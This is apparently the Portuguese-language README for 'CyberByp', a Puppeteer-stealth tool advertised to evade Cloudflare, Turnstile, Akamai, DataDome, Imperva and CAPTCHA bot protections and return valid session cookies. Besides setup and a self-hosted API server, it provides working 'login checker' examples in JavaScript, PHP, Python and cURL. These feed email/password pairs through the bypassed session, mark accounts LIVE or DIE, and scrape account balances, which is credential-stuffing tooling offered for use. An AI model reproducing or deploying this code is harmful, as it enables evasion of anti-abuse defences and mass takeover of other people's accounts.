# CyberByp - Universal Cloudflare Bypass Engine

O **CyberByp** é um motor de bypass universal para Cloudflare, Turnstile, Sucuri, Akamai, DataDome, Imperva e outras proteções web. Ele permite que você acesse sites protegidos e obtenha cookies válidos para usar em suas requisições HTTP.

## 🚀 Instalação

### 1. Clone o repositório ou baixe o arquivo `cyber-byp.js`

git clone https://github.com/seuusuario/cyber-byp.git
cd cyber-byp
2. Instale as dependências
bash
npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth
Nota: O Puppeteer baixa automaticamente o Chromium (~300MB). Se já tiver o Chrome instalado, pule o download com:

bash
export PUPPETEER_SKIP_DOWNLOAD=true
E configure o caminho do Chrome no código: executablePath: '/usr/bin/google-chrome'

3. Pronto! O CyberByp está instalado.
📖 Uso Básico
javascript
const CyberByp = require('./cyber-byp');

(async () => {
    // Criar instância do bypass
    const bypass = new CyberByp({
        headless: 'new',  // 'new' = navegador invisível, false = navegador visível
        timeout: 120000,  // tempo máximo para bypass (2 minutos)
        retry: 5          // número de tentativas
    });
    
    // Inicializar o navegador
    await bypass.init();
    
    // Bypassar uma URL protegida
    const result = await bypass.bypass('https://site-protegido.com');
    
    if (result.ok) {
        console.log('✅ Bypass realizado com sucesso!');
        console.log('🍪 Cookies:', result.cookies);
        console.log('⏱️ Tempo:', result.time);
        console.log('📄 HTML:', result.html.substring(0, 500));
        console.log('🔑 Sessão:', result.session);
        
        // Você pode reutilizar a página para fazer requisições
        const page = result.page;
        // ... fazer login, navegar, etc ...
    } else {
        console.log('❌ Bypass falhou:', result.error);
    }
    
    // Fechar o navegador
    await bypass.close();
})();
🔧 Opções do Construtor
Opção	Tipo	Padrão	Descrição
headless	string/bool	'new'	Modo do navegador. 'new' = invisível, false = visível (para debug)
timeout	number	120000	Tempo máximo em milissegundos para cada tentativa
retry	number	5	Número máximo de tentativas de bypass
📤 Retorno do Método bypass()
O método bypass(url) retorna um objeto com os seguintes campos:

javascript
{
    ok: true,                          // Booleano: sucesso ou falha
    session: 'abc123def456',           // ID único da sessão (para reutilizar)
    cookies: 'nome1=valor1; nome2=valor2',  // Cookies formatados para header HTTP
    cookiesJSON: [                     // Cookies em formato JSON (array de objetos)
        { name: 'nome1', value: 'valor1', domain: '...', ... },
        { name: 'nome2', value: 'valor2', domain: '...', ... }
    ],
    html: '<html>...</html>',          // HTML completo da página após bypass
    time: '8.45s',                     // Tempo gasto no bypass
    page: <PuppeteerPage>              // Objeto Page do Puppeteer (reutilizável)
}
Em caso de erro:
javascript
{
    ok: false,
    error: 'Mensagem do erro',
    session: 'abc123def456'
}
🛡️ Proteções Suportadas
O CyberByp consegue burlar as seguintes proteções:

Proteção	Identificador	Status
Cloudflare Challenge	cf-challenge, Just a moment	✅ Suportado
Cloudflare Turnstile	cf-turnstile, challenges.cloudflare.com	✅ Suportado
Cloudflare WAF	cloudflare-nginx	✅ Suportado
Sucuri CloudProxy	sucuri_cloudproxy, Sucuri	✅ Suportado
Akamai	akamai	✅ Suportado
DataDome	datadome	✅ Suportado
Imperva / Incapsula	imperva, incapsula	✅ Suportado
PerimeterX	px-captcha, PerimeterX	✅ Suportado
Reblaze	reblaze	✅ Suportado
Distil Networks	distil	✅ Suportado
Captcha Genérico	captcha, recaptcha	✅ Suportado
📚 Exemplos de Integração
1. API Server (Express)
Crie um arquivo server.js:

javascript
const CyberByp = require('./cyber-byp');
const express = require('express');
const app = express();

const bypass = new CyberByp();
bypass.init();

// Rota para bypassar URL
app.get('/bypass', async (req, res) => {
    const { url } = req.query;
    if (!url) return res.status(400).json({ error: 'Parâmetro "url" obrigatório' });
    
    try {
        const result = await bypass.bypass(url);
        res.json({
            ok: result.ok,
            cookies: result.cookies,
            time: result.time,
            session: result.session
        });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Rota para pegar cookies de uma sessão existente
app.get('/session/:id', (req, res) => {
    const data = bypass.getSession(req.params.id);
    if (!data) return res.status(404).json({ error: 'Sessão não encontrada' });
    res.json({ cookies: data.cookies, time: data.time });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'online' });
});

app.listen(3000, () => {
    console.log('🔥 CyberByp API rodando em http://localhost:3000');
    console.log('📡 Use: http://localhost:3000/bypass?url=https://site.com');
});
Execute:

bash
npm install express
node server.js
Use:

bash
curl "http://localhost:3000/bypass?url=https://site-protegido.com"
2. Integração com Checker de Login
javascript
const CyberByp = require('./cyber-byp');

async function checkLogin(email, senha) {
    const bypass = new CyberByp();
    await bypass.init();
    
    // 1. Fazer bypass na página de login
    const result = await bypass.bypass('https://site.com/login');
    
    if (!result.ok) {
        await bypass.close();
        return { status: 'ERROR', message: 'Não foi possível acessar o site' };
    }
    
    // 2. Usar a página já autenticada para fazer login
    const page = result.page;
    
    await page.type('input[name="email"]', email);
    await page.type('input[name="password"]', senha);
    await page.click('button[type="submit"]');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    
    // 3. Verificar se logou
    const html = await page.content();
    
    if (html.includes('Bem-vindo') || html.includes('Dashboard') || html.includes('Minha Conta')) {
        // Extrair saldo (exemplo)
        const saldo = await page.evaluate(() => {
            const el = document.querySelector('.balance, .saldo, .credits');
            return el ? el.innerText.trim() : 'R$ 0,00';
        });
        
        await bypass.close();
        return { status: 'LIVE', email, saldo };
    }
    
    await bypass.close();
    return { status: 'DIE', message: 'Login inválido' };
}

// Usar
(async () => {
    const resultado = await checkLogin('teste@gmail.com', 'senha123');
    console.log(resultado);
})();
3. Integração com PHP
php
<?php
function cyberBypass($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'http://localhost:3000/bypass?url=' . urlencode($url),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 120,
    ]);
    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);
    return $result;
}

// Exemplo de uso em um checker de login
$login = $_GET['email'] ?? 'teste@gmail.com';
$senha = $_GET['senha'] ?? '123456';

// 1. Bypass na página de login
$bypass = cyberBypass('https://site-protegido.com/login');

if ($bypass['ok']) {
    // 2. Usar os cookies do bypass
    $cookies = $bypass['cookies'];
    
    // 3. Fazer requisição de login
    $ch = curl_init('https://site-protegido.com/login');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'email' => $login,
            'password' => $senha
        ]),
        CURLOPT_HTTPHEADER => [
            'Cookie: ' . $cookies,
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // 4. Verificar se logou
    if (strpos($response, 'Bem-vindo') !== false) {
        echo "✅ LIVE | $login | Login bem sucedido!";
    } else {
        echo "❌ DIE | $login | Login inválido";
    }
} else {
    echo "❌ ERROR | Não foi possível acessar o site";
}
?>
4. Integração com Python
python
import requests

def cyber_bypass(url):
    """Faz bypass de Cloudflare e retorna cookies"""
    r = requests.get(
        'http://localhost:3000/bypass',
        params={'url': url},
        timeout=120
    )
    return r.json()

# Exemplo de uso
result = cyber_bypass('https://site-protegido.com/login')

if result['ok']:
    cookies = result['cookies']
    session_id = result['session']
    
    # Usar cookies para fazer login
    import requests
    r = requests.post(
        'https://site-protegido.com/login',
        data={'email': 'teste@gmail.com', 'password': 'senha123'},
        headers={
            'Cookie': cookies,
            'User-Agent': 'Mozilla/5.0'
        }
    )
    
    if 'Bem-vindo' in r.text:
        print('✅ Login bem sucedido!')
    else:
        print('❌ Login inválido')
else:
    print('❌ Bypass falhou:', result['error'])
5. Integração com cURL (linha de comando)
bash
# 1. Inicie o servidor CyberByp
node server.js

# 2. Faça bypass e pegue os cookies
RESULT=$(curl -s "http://localhost:3000/bypass?url=https://site-protegido.com")
COOKIES=$(echo $RESULT | jq -r '.cookies')

# 3. Use os cookies para fazer requisições
curl -X POST "https://site-protegido.com/login" \
  -H "Cookie: $COOKIES" \
  -d "email=teste@gmail.com&password=senha123"
🖥️ Deploy em Servidor Linux (VPS)
bash
# 1. Atualizar sistema
sudo apt update && sudo apt upgrade -y

# 2. Instalar Node.js 18+
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# 3. Instalar Chrome/Chromium
sudo apt install -y chromium-browser

# 4. Criar pasta do projeto
mkdir cyber-byp && cd cyber-byp

# 5. Baixar o cyber-byp.js (ou clonar do git)
# Coloque o arquivo cyber-byp.js aqui

# 6. Instalar dependências
npm init -y
npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth express

# 7. Criar server.js (com o código da seção API Server)

# 8. Instalar PM2 para manter rodando
npm install -g pm2
pm2 start server.js --name cyber-byp
pm2 save
pm2 startup
❓ FAQ
P: Preciso de uma chave de API?
R: Não. O CyberByp é 100% gratuito e self-hosted.

P: Funciona em Windows?
R: Sim! Instale o Node.js e execute normalmente.

P: O bypass é detectável?
R: O CyberByp usa técnicas avançadas de anti-detecção (stealth), tornando-o praticamente indetectável.

P: Quanto tempo demora o bypass?
R: Geralmente entre 5 e 15 segundos, dependendo da proteção do site.

P: Posso usar em produção?
R: Sim! Use o PM2 para manter o servidor rodando 24/7.

P: Suporta proxy?
R: Sim! Passe --proxy-server=ip:port nos args do Puppeteer.

📝 Licença
MIT - Faça o que quiser, apenas mantenha os créditos.

by misantropi4#cybersec
